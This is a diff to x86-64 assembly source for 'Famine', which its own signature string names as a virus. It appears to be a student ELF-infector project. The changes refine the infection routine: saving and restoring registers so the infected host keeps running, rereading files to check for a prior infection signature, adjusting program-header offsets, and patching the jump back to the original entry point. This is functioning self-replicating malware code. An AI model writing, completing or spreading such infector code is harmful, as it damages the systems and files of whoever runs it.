@@ -3,6 +3,18 @@ section .text
 	signature db "Famine version 1.0 (c)oded by <pgoudet>-<Mastermind pgoudet>",0
 
 _start:
+	nop
+	nop
+	nop
+	nop
+	nop
+	push rsp
+    push rax
+    push rdi
+    push rsi
+    push rdx
+    push rcx
+	push rbx
 	sub    rsp,0x18
 	lea    rdi,[rsp+0x3]
 	mov    DWORD [rsp+0x9],0x6d742f2e
@@ -19,6 +31,13 @@ _start:
 	xor    edi,edi
 	call   ft_syscall
 	add    rsp,0x18
+	pop rbx
+	pop rcx
+    pop rdx
+    pop rsi
+    pop rdi
+    pop rax
+    pop rsp
 	ret
 
 virus:
@@ -381,21 +400,28 @@ ft_strstr:
 
 checkSignature:
 	sub    rsp,0x1010
-	xor    eax,eax
+	mov    [rsp],rdi
+checkSignature.do:
 	mov    r8,rsi
-	mov    QWORD [rsp+0x8],rax
-	lea    r9,[rsp+0x10]
-	mov    rax,QWORD [rsp+0x8]
+	xor    rax,rax
+	mov    rdi,[rsp]
+	lea    rsi,[rsp+0x10]
+	mov    rdx,0x1000
 	syscall
+	mov    [rsp+0x8],rax
 	mov    edx,0x1000
 	mov    rsi,r8
-	mov    rdi,r9
+	lea    rdi,[rsp+0x10]
 	call   ft_strstr
-	dec    al
-	je     checkSignature+53
-	xor    eax,eax
-	jmp    checkSignature+58
+	cmp    rax,1
+	je     checkSignature.endTrue
+	cmp    qword [rsp+0x8],0
+	jg     checkSignature.do
+	xor    rax,rax
+	jmp    checkSignature.end
+checkSignature.endTrue:
 	mov    eax,0x1
+checkSignature.end:
 	add    rsp,0x1010
 	ret
 
@@ -460,6 +486,7 @@ setHeaders:
 	mov    r9,rdx
 	sub    r9,QWORD [rax+0x20]
 	add    rdx,0x1000
+	add    rcx,0x42
 	mov    QWORD [rsi+0x18],rcx
 	mov    rcx,QWORD [rsi+0x28]
 	lea    rcx,[r9+rcx*1+0x1000]
@@ -605,13 +632,13 @@ change_program_header:
 addJump:
 	push   rbx
 	movsxd rbx,edi
+	add    rsi,0x90
 	mov    r8d,0x8
-	xor    ecx,ecx
 	mov    rdi,rbx
-	xor    edx,edx
+	xor    ecx,ecx
 	sub    rsp,0x20
-	mov    QWORD [rsp+0x8],rsi
-	mov    esi,0x74 + 0x61
+	mov    QWORD [rsp+0x8],rdx
+	xor    edx,edx
 	sub    QWORD [rsp+0x8],0x4
 	mov    BYTE [rsp+0x1f],0xe9
 	call   ft_syscall
@@ -629,7 +656,7 @@ addJump:
 	call   ft_syscall
 	add    rsp,0x20
 	pop    rbx
-	ret
+	ret    
 
 insertCode:
 	push   r14
@@ -665,11 +692,13 @@ insertCode:
 	mov    rsi,signature
 	mov    r8d,0x1
 	call   ft_syscall
-	mov    rsi,QWORD [r14+0x18]
-	mov    edi,ebp
-	sub    rsi,r12
-	sub    rsi,QWORD [rbx+0x18]
-	sub    rsi,QWORD [rbx+0x28]
+    mov    rdx,QWORD [r14+0x18]
+   	mov    rsi,QWORD [rbx+0x28]
+   	mov    edi,ebp
+   	sub    rdx,r12
+   	sub    rdx,QWORD [rbx+0x18]
+   	sub    rdx,rsi
+   	add    rsi,QWORD [rbx+0x8]
 	pop    rbx
 	pop    rbp
 	pop    r12
